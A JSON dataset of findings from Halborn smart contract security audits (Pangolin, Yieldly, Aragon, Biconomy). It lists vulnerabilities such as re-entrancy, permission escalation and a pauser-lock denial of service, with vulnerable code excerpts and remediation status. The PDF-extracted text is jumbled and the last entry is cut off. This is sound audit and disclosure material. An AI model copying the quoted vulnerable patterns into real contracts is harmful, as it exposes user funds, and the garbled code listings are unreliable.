statement. 14 Remediation Plan: SOLVED: recommendation. preventing gas usage from increasing too much. The Pangolin Team solved this issue by implementing the above The maximum number of recipients has been set to 40, Commit ID: 9563309e6aaf1d0fc930a94cb0fc903d7017d40a 15 ",
        "labels": [
            "Halborn",
            "Pangolin_AllocationVester",
            "Severity: Low"
        ]
    },
    {
        "title": "INACCURATE REWARD RATE CALCULATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_AllocationVester_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "AllocationVester.sol contract calculates the reward unlock rate by dividing the total amount of tokens to be unlocked by the total vesting period (in seconds), which can go from eight weeks (4838400 seconds) to infinity. However, when the amount of tokens is a number of the same order as the total vesting period, rounding Solidity to zero will introduce inaccuracies in the result of the uint division: The accuracy of the reward unlock rate depends primarly on the ERC20 token to be distributed, which is associated with the AllocationVester contract during its deployment. The use of the token contracts with high decimal values such as Png (18) is considered safe, but the use of contracts with lower decimal values such as USDT (6) may result in an inaccurate rate calculation, which can undermine user trust. For example, allocating 30 USDT for one year would result in an unlock rate of 0, and it would take 5% more time to unlock 1000 USDT allocated for two years. However, it has been noted that incorrectly set allocations can be easily overridden by the contract owner, if needed, causing locked funds to be returned to the contract reserve. 16 Code Location: Listing 2: Reward rate calculation (Line 146) 144 // add vesting info for the member 145 member . reserve += allocation ; 146 member . rate = allocation / duration ; 147 member . lastUpdate = block . timestamp ; Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider checking the decimals of the token to be distributed in the AllocationVester constructor. Also, before deployment, consider reviewing the use cases of the contract and the associated token to ensure the currently implemented reward calculation algorithm does not have perceptible rounding errors. Remediation Plan: The Pangolin Team solved this issue by multiplying the token SOLVED: allocation by a coefficient that will add 11 decimals of precision when calculating the reward unlock rate, which is considered enough for this contract. Commit ID: 69fa24b3b55c0c7b5bc566354e9b1b36eb3f6272 17 ",
        "labels": [
            "Halborn",
            "Pangolin_AllocationVester",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_AllocationVester_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "AllocationVester.sol contract uses the floating pragma ^0.8.0. The contract should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Code Location: Listing 3: Floating pragma (Line 3) 3 pragma solidity ^0.8.0; Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider locking the pragma version with known bugs for the compiler version. When possible, do not use floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: PENDING: in future releases. The Pangolin Team acknowledged this issue and will address it 18 ",
        "labels": [
            "Halborn",
            "Pangolin_AllocationVester",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENTS EMITTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_AllocationVester_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "has been observed It emitting events. AllocationVester contract: that missing The following functions should emit events in the functionalities important are Fuctions with events missing:  withdraw()  harvest() Risk Level: Likelihood - 1 Impact - 2 Recommendation: Consider emitting an event when calling related functions on the list above. Remediation Plan: SOLVED: The Pangolin Team solved this issue by defining new events that will be emitted every time a reward pickup or withdrawal occurs. Commit ID: d8137ff12bfbf6c083939b8d487e6dd47a70a3ea 19 ",
        "labels": [
            "Halborn",
            "Pangolin_AllocationVester",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_AllocationVester_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The constructor of the AllocationVester contract is missing address validation. The distributionToken parameter should be checked to be non-zero. This is considered a best practice. Code Location: Listing 4: Missing zero address check (Line 61) 60 61 62 constructor ( IERC20 distributionToken ) { token = distributionToken ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to validate that each address inputs in the constructor and other critical functions are non-zero. Remediation Plan: SOLVED: The Pangolin Team solved this issue by implementing a zero check address in the contract constructor. Commit ID: 2a5bb1afe0e1cb0aab67b9f8e75970a3ad75c992 20 ",
        "labels": [
            "Halborn",
            "Pangolin_AllocationVester",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING INTEGER UNDERFLOW PROTECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Multi_Staking_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented with a given number of bits, either larger than the maximum or lower than the minimum value. Side Note: Listing 1 1 b - A minus B , where A and B are byte - arrays interpreted as big - endian unsigned integers . Fail on underflow . Code Location: Listing 2 1 resumeRewardCalc : 2 // Calculate the amount of rewards unlocked 3 byte \" End_Date \" 4 app_global_get 5 byte \" Start_Date \" 6 app_global_get 7 b - 8 store 10 9 load 10 10 byte \" End_Date \" 11 app_global_get 12 load 13 13 b - 14 b - 15 byte \" Rewards_Locked \" // \" End_Date \" // bytex // bytex \" Start_Date \" // bytex bytex // bytex // null // bytex // bytex \" End_Date \" // bytex intx // bytex intx intx // bytex intx // bytex // bytex \" R TODO { HANDLE UNDERFLOW } 13 Listing 3 1 resumeRewardCalc : 2 // Calculate the amount of rewards unlocked 3 byte \" End_Date \" 4 app_global_get 5 byte \" Start_Date \" 6 app_global_get 7 b - 8 store 10 9 load 10 10 byte \" End_Date \" 11 app_global_get 12 load 13 13 b - 14 b - 15 byte \" Rewards_Locked \" 16 app_global_get 17 b * 18 load 10 19 b / 20 byte \" Rewards_Unlocked \" // intx \" Rewards_Unlocked \" 21 app_global_get 22 b - 23 store 2 // \" End_Date \" // bytex // bytex \" Start_Date \" // bytex bytex // bytex // null // bytex // bytex \" End_Date \" // bytex intx // bytex intx intx // bytex intx // bytex // bytex \" Rewards_Locked \" // bytex intx // bytex // bytex bytex // bytex // intx intx // intx // null TODO { HANDLE UNDERFLOW } Recommendation: The variable should be checked with pre-condition. Remediation Plan: SOLVED: Yieldly.Finance implemented necessary checks. 14 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Multi_Staking_Algorand",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF MAXIMUM FEE BOUND DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Multi_Staking_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The fee does not have an upper/lower limit, which may make liquidity provider make no profit. The fee is defined as constant, therefore fee could not set by an admin on the contracts. Code Location: Listing 4: Fee is Defined Constant 1 // Makes sure the fee from the first txn is at least 2000 ( min // Fee // Fee intx // 1||0 // null ( if 0 then Failed ) amount ) 2 gtxn 0 Fee 3 int 2000 4 >= 5 assert Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to defined setter function fee function. However, the function should have upper/lower limit on the fee setter function. Remediation Plan: NOT APPLICABLE: The Yieldly.Finance claims that the implementation should be having minimum 2000 fee. The documentation has been reviewed and the implementation has been confirmed. 15 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Multi_Staking_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF MULTISIG PROGRAM",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Multi_Staking_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The principal benefit of multisig is that it creates added redundancy in key management. While single signature addresses require only a single key for transactions, multisignature addresses require multiple keys. To protect against malicious admin, it may be necessary to use a multi signature. By using this mechanism, a malicious admin actions could be prevented. Code Location: 16 Example Definition: Listing 5: Multisig Implementation 2 goal account multisig new -T 2 account1 account2 account3 -d ~/ node / data 3 goal clerk multisig signprogram -p / tmp /* . teal -a account1 -A account2 -o / tmp / simple . lsig -d ~/ node / data Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the contract, The multi-signature should be implemented over a creator account. Remediation Plan: ACKNOWLEDGED: Yieldly.Finance consider to use multi-signature on the main net deployment. 17 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Multi_Staking_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING PROXY ASSET DEFINITION ON THE FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Multi_Staking_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Yieldly.Finance workflow, Escrow connection is made with a proxy contract. According to documentation, Escrow only allows transactions tied with proxy. But, in some functions, transactions dont go through the Proxy asset. Code Location: Listing 6: winnerProgram Function (Lines 1) 1 2 3 4 5 6 7 8 9 let txn = await configs . winnerProgram ( account2 , escrowAddress , algoAppId , asaAppId , trackerAppId , winner , rateAppId ); Listing 7: assetOptoutApplication Function (Lines 1) 1 2 3 4 5 6 let txn1 = await configs . assetOptoutApplication ( account1 , escrowAddress , optingAppId , assetId ); 18 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to construct transactions through a proxy which is interacting with escrow. Remediation Plan: NOT APPLICABLE: Yieldly.Finance does not need to use proxy for the escrow asset after program version (5). 19 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Multi_Staking_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING FREEZE/REVOKE ASSETS DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Multi_Staking_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When an asset is created, the contract can provide a freeze address and a defaultfrozen state. If the defaultfrozen state is set to true the corresponding freeze address must issue unfreeze transactions, one per account, to allow trading of the asset to and from that account. This may be useful in situations that require holders of the asset to pass certain checks prior to ownership. (KYC/AML) The clawback address, if specified, is able to revoke the asset from any account and place them in any other account that has previously opted-in. This may be useful in situations where a holder of the asset breaches some set of terms that you established for that asset. You could issue a freeze transaction to investigate, and if you determine that they can no longer own the asset, you could revoke the assets. 20 Asset Explorer: Risk Level: Likelihood - 1 Impact - 1 Recommendation: According to workflow, the application should activate freeze and revoke assets. If the application would rather ensure to asset holders that the application will never have the ability to revoke or freeze assets, set the clawback/freeze address to null. Remediation Plan: ACKNOWLEDGED: Yieldly.Finance does not need to use revoke or freeze feature on the assets. The Revoke and Freeze addresses are disabled. 21 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Multi_Staking_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "SELF PERMISSIONS DO CASCADE TO EXTERNAL CONTRACTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The _auth function on the PermissionManager is being used to verify if a given permission (permission id) is set to a contract (where) from a specific origin (from). The check does verify in two different scenarios:  The where contract does have the permission from the current sender.  The current contract (address(this)) does hold the permission from the current sender. This means that if a given permission (PERMx) is set to the self contract, any call to any contract (anywhere) that may use the permission (PERMX) will succeed due to the second check. It has been seen that the entire code base is always using a where of address(this) which means that the where check is redundant and unused and adds a possible critical scenario described below. Code Location: Listing 1: src/core/permission/PermissionManager.sol (Lines 336,337) 334 function _auth ( address _where , bytes32 _permissionId ) private view  { 335 336 if (  data ) && 337 338 339 340 341 342 343 ! isGranted ( address ( this ) , msg . sender , _permissionId , msg . ! isGranted ( _where , msg . sender , _permissionId , msg . data ) ) { revert Unauthorized ({ here : address ( this ) , where : _where , who : msg . sender , permissionId : _permissionId 15 344 345 346 } }) ; } Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended that the where check is removed from the _auth function on the PermissionManager. If thats not possible due to architectural designs on future releases, the documentation should clearly state that providing a different where clause rather than address(this) can lead to bad behaviors and possible privilege escalation issues.  If the contract x inherits from permission manager, it should only If be using the modifier such as auth(address(this, permission). not, and it has auth(where, permission), this is dangerous because if user A is granted permission Y on address(this)= x, it automatically means it has permission Y anywhere.  Plugins or other contracts that are part of the DAO shouldnt use the modifier of Permission Manager. If they do, the same situation as the previous point could happen. This is not possible unless a custom contract is written. Remediation Plan: SOLVED: The Aragon team did change all auth(where, permission) modifiers to use auth(permission) which explicitly uses the DAO authorization system and does not rely on the Permissionmanager function. 16 ",
        "labels": [
            "Halborn",
            "Aragon_aragonOS",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNTRUSTED PLUGIN USAGE CAN CAUSE DOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Installing or upgrading a plugin without prior validation can lead to the contract and DAO being nonfunctional. This is possible if a plugin does self-destruct during the installation or upgrade. Furthermore, not only caution should be taken during the installation/upgradability but also on the deployed implementation contract as it would lead all proxied contracts to be unusable. Risk Level: Likelihood - 1 Impact - 5 Recommendation: All contracts using UUPSUpgradeable should make sure that the contract implementation is initialized and access controls mechanism are in place so no one can perform any upgrade and self-destruct the implementation A good suggestion is to use _disableInitializers on contract itself. those contract constructors. Doing so could cause all proxies to be invalid and nonfunctional. Furthermore, DAOs should make sure that used plugins do not contain untrusted calls and executions. Remediation Plan: SOLVED: The Aragon team added _disableInitializers and stated that no action could happen due to a bad implementation initialization or take- over. 17 ",
        "labels": [
            "Halborn",
            "Aragon_aragonOS",
            "Severity: Medium"
        ]
    },
    {
        "title": "MERKLE ROOT RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The merkleMint function on the MerkleMinter contract does allow specifying a previous used _merkleRoot. The merkle proofs do not consider the token being used as part of the proof. This allows the same proof, with the same merkle root, to be used for any token. This means that the created MerkleDistributor will successfully mint the tokens independently of the This scenario is unlikely to internal token used for a valid proof. happen, but bots could be constantly scanning the blockchain for such scenario and profit from it. Risk Level: Likelihood - 3 Impact - 1 Recommendation: The code should check that the _merkleRoot is not reused, this will prevent proof re-usage to mint another token from a previous used proof of another token. With the current code implementation, it is hard to prevent this scenario on multiple MerkleMinter being generated with the TokenFactory as it would require the factory to keep track of the roots. However, it is possible to protect against this on a MerkleMinter bases and assume the other scenario by checking the re-usage of the Merkle Root on the MerkleMinter contract itself. Remediation Plan: NOT APPLICABLE: The Aragon team stated that this is considered a feature rather than a potential issue, as this would allow multiple tokens to be generated for the same address list without having to modify the root. 18 ",
        "labels": [
            "Halborn",
            "Aragon_aragonOS",
            "Severity: Low"
        ]
    },
    {
        "title": "EMPTY SUBDOMAIN ALLOWED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The registerPluginRepo function on the PluginRepoRegistry contract does allow specifying an empty string as a subdomain, which will result in the c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 hash node. This is allowed due to the registering function and the isSubdomainValid internal function considering an empty string as a valid subdomain. Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended that the isSubdomainValid function does verify that the string is not empty to cover all possible invalid subdomains. Remediation Plan: SOLVED: The code now reverts if the subdomain string is empty before the isSubdomainValid check. 19 ",
        "labels": [
            "Halborn",
            "Aragon_aragonOS",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING CALLBACK SELECTOR ZERO CASE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The _registerCallback function on the CallbackHandler contract does allow registering the _callbackSelector of 0x00000000 which refers to the Solid- ity EVM fallback or receive functions. The callBackSelector is expected to be equal to _magicNumber in most of the cases. However, it is possible that _magicNumber is different from callBackSelector. For the former, when they are equal, registering the _magicNumber/callBackSelector of 0x00000000 will cause any call not handled by the EVM, such as data=0 x to revert even after register. However, the _handleCallback, does treat the 0x0 (_magicNubmer) as UNREGISTERED_CALLBACK which will cause the transaction to revert. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended that if the DAO wants to register the callBackSelector=0 x00000000 to use _magicNumber different from 0x0. Furthermore, it will be a nice option to enforce that the _registerCallback function _magicNumber is always different from 0x and add an unregisterCallback function which sets the _magicNumber for a given callBackSelector to 0x0. Remediation Plan: ACKNOWLEDGED: The Aragon team and Halborn agreed on the low severity of this issue and stated that reverting unhandled selectors to default is a good option, as it would force the developers to explicitly add the selector if it is required. 20 ",
        "labels": [
            "Halborn",
            "Aragon_aragonOS",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED CODE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aragon_aragonOS_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Furthermore, The _applyRatioFloored is never being used in the code. as the function name states, the result will be floored and the decimal precision lost. It is recommended to either remove the code or take extra precaution when using the function, as unexpected results may occur. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove any unused code or provide valid recommenda- tions and suggestions on the documentation on how to use those. Remediation Plan: SOLVED: The Aragon team did remove the unused code. 21 MANUAL TESTING 22 4.1 DAO  Permissions are correctly described.  No missing arguments and bad interface implementations.  All inherited contracts are upgradeable safe.  Initializer does have all initializers for inherited contracts.  All calls do check for valid return value and revert otherwise (if not prevented by the failure mapping).  Since the contract does use funds, it has both fallback and receive functions implemented.  Setters do have ACL permissions. 4.2 PermissionManager  All inherited contracts are upgradeable safe.  Permissions are correctly described.  No missing arguments and bad interface implementations.  Granting permissions are implemented as expected  Validating given permissions is implemented as expected, one issue described in the report as a vulnerability.  Granting ROOT permissions or protected permission to ANY_ADDR is restricted correctly.  Revoking does revoke correctly and works for ANY_ADDR. However, it should be stated that revoking a strictly specified where/from permission with ANY_ADDR will not revoke the permission. ANY_ADDR on the revoke function cannot be treated as a clean all permissions. 4.3 DAOFactory  Internal permissions are correctly used.  DAO permissions are the ones necessary for the operation and all registered in the isPermissionRestrictedForAnyAddr.  All temporary permissions given to the factory are successfully 23 G N I T S E T L A U N A M removed afterward.  The newly created dao is registered on the DAORegistry. 4.4 InterfaceBasedRegistry  It does not allow registering twice the same address  All inherited contracts are upgradeable safe.  Permissions are correctly described.  No missing arguments and bad interface implementations. 4.5 PluginSetupProcessor  Permissions are correctly described.  No missing arguments and bad interface implementations.  All the prepare statements are using preparedSetupIdToBlockNumber internally to store the current state. All the states are differ- entiated against them by the action, such as install, upgrade and uninstall. This is important; otherwise, a prepare statement will be applicable in any action independently of the prepare action. Meaning that a prepareUninstall could be used on the applyUpdate state, causing bad behaviours and unexpected results.  The installation preparation does verify that the plugin repo is registered.  The prepareUpdate does not verify that the repo is registered, as it is assumed to be if installed by checking currentAppliedSetupId. 4.6 ENSSubdomainRegistrar  It does correctly create the ENS node by packing the base node and label, in this order.  Label is being passed as the keccak256 of the subdomain as specified in the ENS documentation. 24 G N I T S E T L A U N A M  Internal permissions are correctly used and delegated to the DAO. 4.7 AddresslistVoting  Proposal creation is based on the Addresslist implementation, which uses the CheckpointsUpgradeable contract from OZ.  The ability to create a proposal requires the member to have the voting power in the block before the proposal creation. This does prevent possible front-runs.  If a user gets removed from the list, it will still be able to vote for proposals that were created before its removal. 4.8 TokenVoting  Proposal creation is based on the ERC20Voting implementation, which uses snapshot mechanisms to store the balance for a given address back in time.  The ability to create a proposal requires the member to have the voting power in the block before the proposal creation. This does prevent possible front-runs.  New voting power (either increment or decrement) will not be taken into consideration for past proposals, which means that a user could still vote if it had enough power before the proposal was created. G N I T S E T L A U N A M 25 ",
        "labels": [
            "Halborn",
            "Aragon_aragonOS",
            "Severity: Informational"
        ]
    },
    {
        "title": "RENOUNCING PAUSER ROLE WHEN CONTRACT IS PAUSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "There are multiple roles on the LiquidityPoolManager contract such as Owner, Pauser and TrustedForwarder. According to the contract functions, it is possible to set Owner and Pauser addresses to zero by using renounceOwnership and renouncePauser functions. The Pauser role can pause the contract. If the private key of this Pauser is compromised, an attacker can pause the contract and renounce the pauser role, then the attacker can render the contract useless forever. Risk Level: Likelihood - 4 Impact - 4 13 Proof Of Concept: This attack has three stages which are described below: 1. In the first screenshot, everything looks proper. Three functions are called during the step one: isPaused(), isPauser() and pauser() public functions in order. 2. After the first step, the pause() function has to be called by any user which has Pauser role. It can be seen that isPaused() function returned true as a boolean variable on the following screenshot. 14 3. Finally, the renouncePauser() function needs to be called on the contract that is in the pause state. After this action, the Pauser address will be set to address(0) and the contract will never be able to return from the paused state. 15 Recommendation: It is recommended to add the whenNotPaused modifier to the renouncePauser function. In addition, the pauser role should not be the address(0) for not disrupting the flow of the contract. Remediation Plan: SOLVED: Biconomy Team solved this issue by adding whenNotPaused modifier to the renouncePauser function. 16 ",
        "labels": [
            "Halborn",
            "Biconomy_LiquidityPoolManager",
            "Severity: High"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The Owner of the contract is usually the account that deploys the contract. As a result, the Owner is able to perform some privileged functions like setBaseGas() and setExecutorManager(). In the LiquidityPoolManager.sol smart contract, the renounceOwnership function is used to renounce the Owner permission. Renouncing ownership before transferring would result in the contract having no Owner, eliminating the ability to call privileged functions. Risk Level: Likelihood - 2 Impact - 3 Code Location: Listing 1: LiquidityPoolManager.sol Ownable (Lines 15) 15 contract LiquidityPoolManager is ReentrancyGuard , Ownable , BaseRelayRecipient , Pausable { 16 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. 17 Listing 2: Disable RenounceOwnerShip (Lines 1) 1 2 3 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \"); // not possible with this smart contract } Remediation Plan: SOLVED: Biconomy Team added a new statement for renounceOwnership and renouncePauser functions to solve the issue. 18 ",
        "labels": [
            "Halborn",
            "Biconomy_LiquidityPoolManager",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CHECK ON CONSTRUCTOR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The LiquidityPoolManager contract includes different type of roles. For example, there is Owner role for setting the adminFee value. For another example, the Pauser role pauses the contract if something wrong with the transactions or contract logic. It is important to provide these roles to valid addresses. These roles should be driven by people. There are too many address checks in the LiquidityPoolManager contract to keep these roles safe. For example, it is not possible to set Owner, Pauser and TrustedForwarder addresses to address(0) after initialization of the contract. However, it is possible to set Pauser address to address(0) because of the lack of address control on constructor. Risk Level: Likelihood - 2 Impact - 3 Code Location: Listing 3: LiquidityPoolManager.sol (Lines 68,69,70,71) 67 constructor ( address _executorManagerAddress , address owner , address pauser , address _trustedForwarder , uint256 _adminFee ) public Ownable ( owner ) Pausable ( pauser ) { require ( _executorManagerAddress != address (0) , \" ExecutorManager Contract Address cannot be 0 \"); require ( owner != address (0) , \" Owner Address cannot be 0 \"); require ( _trustedForwarder != address (0) , \" TrustedForwarder Contract Address cannot be 0 \" ); require ( _adminFee != 0 , \" AdminFee cannot be 0 \" ); executorManager = ExecutorManager ( _executorManagerAddress ) ; trustedForwarder = _trustedForwarder ; adminFee = _adminFee ; 68 69 70 71 72 73 74 19 75 76 } baseGas = 21000; Recommendation: Implementing zero address check on constructor strongly recommended by Halborn team. Remediation Plan: SOLVED: Biconomy Team added address control check to the constructor. 20 ",
        "labels": [
            "Halborn",
            "Biconomy_LiquidityPoolManager",
            "Severity: Low"
        ]
    },
    {
        "title": "TAUTOLOGY EXPRESSIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In contract LiquidityPoolManager.sol, tautology expressions have been detected. Such expressions are of no use since they always evaluate true/false regardless of the context they are used in. Risk Level: Likelihood - 2 Impact - 2 Code Location: Listing 4: LiquidityPoolManager.sol (Lines 154) 153 function addTokenLiquidity ( address tokenAddress , uint256 amount ) public tokenChecks ( tokenAddress ) whenNotPaused { 154 require ( amount > 0, \" amount should be greater then 0 \"); Listing 5: LiquidityPoolManager.sol (Lines 273) 272 function withdrawErc20 ( address tokenAddress ) public onlyOwner whenNotPaused { 273 274 275 uint256 profitEarned = ( IERC20 ( tokenAddress ). balanceOf ( address ( this )) ). sub ( tokensInfo [ tokenAddress ]. liquidity ) ; require ( profitEarned > 0, \" Profit earned is 0 \" ); address payable sender = _msgSender () ; Recommendation: Correct the expressions. declared as type uint256, they are always greater or equal to 0. Since amount and profitEarned variables are 21 Remediation Plan: SOLVED: Biconomy Team fixed expressions on modifiers related to the current issue. 22 ",
        "labels": [
            "Halborn",
            "Biconomy_LiquidityPoolManager",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_LiquidityPoolManager_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The Re-Entrancy attack is performed when it is possible to interrupt an execution in the middle, initiated over, and both runs can complete In the context of Ethereum Smart without any errors in execution. Contracts, Re-Entrancy can lead to serious vulnerabilities such as loss of assets. During the tests, a pattern seen in Smart contract re-entrancy attacks was detected. The new withdraw functions added with the latest update are using call.value() method which is less secure than transfer and send against possible re-entrancy attacks. These new functions are only callable by contract owner. This situation decreases the severity of the issue. 23 Code Location: Listing 6: LiquidityPoolManager.sol (Lines 163) 156 function removeNativeLiquidity ( uint256 amount ) external whenNotPaused nonReentrant { 157 158 159 160 161 162 163 164 165 166 167 require ( amount != 0 , \" Amount cannot be 0 \"); address payable sender = _msgSender () ; require ( tokensInfo [ NATIVE ]. liquidityProvider [ sender ] >= amount , \" Not enough balance \"); tokensInfo [ NATIVE ]. liquidityProvider [ sender ] = tokensInfo [ NATIVE ]. liquidityProvider [ sender ]. sub ( amount ); tokensInfo [ NATIVE ]. liquidity = tokensInfo [ NATIVE ]. liquidity . sub ( amount ); ( bool success , ) = sender . call { value : amount }( \" \"); require ( success , \" Native Transfer Failed \" ); emit LiquidityRemoved ( NATIVE , amount , sender ); } Listing 7: LiquidityPoolManager.sol (Lines 254) 247 function sendFundsToUser ( address tokenAddress , uint256 amount , address payable receiver , bytes memory depositHash , uint256 tokenGasPrice ) external nonReentrant onlyExecutor tokenChecks ( tokenAddress ) whenNotPaused { 248 249 250 251 252 253 254 255 256 257 258 259 uint256 initialGas = gasleft () ; . . . if ( tokenAddress == NATIVE ) { require ( address ( this ). balance >= amountToTransfer , \" Not Enough Balance \"); ( bool success , ) = receiver . call { value : amountToTransfer }( \" \"); require ( success , \" Native Transfer Failed \" ); } else { require ( IERC20 ( tokenAddress ). balanceOf ( address ( this )) >= amountToTransfer , \" Not Enough Balance \"); SafeERC20 . safeTransfer ( IERC20 ( tokenAddress ) , receiver , amountToTransfer ); } 24 Listing 8: LiquidityPoolManager.sol (Lines 336) 328 function withdrawNative () external onlyOwner whenNotPaused { 329 330 331 . sub ( tokensInfo [ NATIVE ]. liquidity ) . sub ( adminFeeAccumulatedByToken [ uint256 profitEarned = ( address ( this ). balance ) NATIVE ]) . sub ( gasFeeAccumulatedByToken [ NATIVE ]) ; require ( profitEarned != 0 , \" Profit earned is 0 \"); address payable sender = _msgSender () ; ( bool success , ) = sender . call { value : profitEarned }( \" \"); require ( success , \" Native Transfer Failed \" ); emit fundsWithdraw ( address ( this ) , sender , profitEarned ); 332 333 334 335 336 337 338 339 340 } Listing 9: LiquidityPoolManager.sol (Lines 346) 342 function withdrawNativeAdminFee ( address payable receiver ) external 343 344 345 346 347 348 349 350 onlyOwner whenNotPaused { uint256 adminFeeAccumulated = adminFeeAccumulatedByToken [ NATIVE ]; require ( adminFeeAccumulated != 0 , \" Admin Fee earned is 0\" ) ; adminFeeAccumulatedByToken [ NATIVE ] = 0; ( bool success , ) = receiver . call { value : adminFeeAccumulated }( \"\" ); require ( success , \" Native Transfer Failed \" ); emit AdminFeeWithdraw ( address ( this ) , receiver , adminFeeAccumulated ); } Listing 10: LiquidityPoolManager.sol (Lines 356) 352 function withdrawNativeGasFee ( address payable receiver ) external onlyOwner whenNotPaused { uint256 gasFeeAccumulated = gasFeeAccumulatedByToken [ NATIVE ]; require ( gasFeeAccumulated != 0 , \" Gas Fee earned is 0 \"); gasFeeAccumulatedByToken [ NATIVE ] = 0; 353 354 355 25 356 357 358 359 360 ( bool success , 